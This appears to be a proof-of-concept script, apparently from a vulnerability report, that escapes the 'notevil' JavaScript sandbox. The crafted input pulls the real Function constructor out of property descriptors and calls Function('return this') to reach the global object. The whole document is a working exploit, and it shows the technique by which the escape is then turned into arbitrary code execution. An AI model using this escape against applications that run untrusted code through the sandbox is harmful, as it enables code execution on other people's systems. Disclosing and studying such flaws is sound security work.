var safeEval = require('notevil')
var input = "" + 
  "function fn() {};" + 
  "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" + 
  "var properties = Object.values(constructorProperty);" + 
  "properties.pop();" + 
  "properties.pop();" + 
  "properties.pop();" + 
  "var Function = properties.pop();" + 
  "(Function('return this'))()"; 
console.log(safeEval(input))
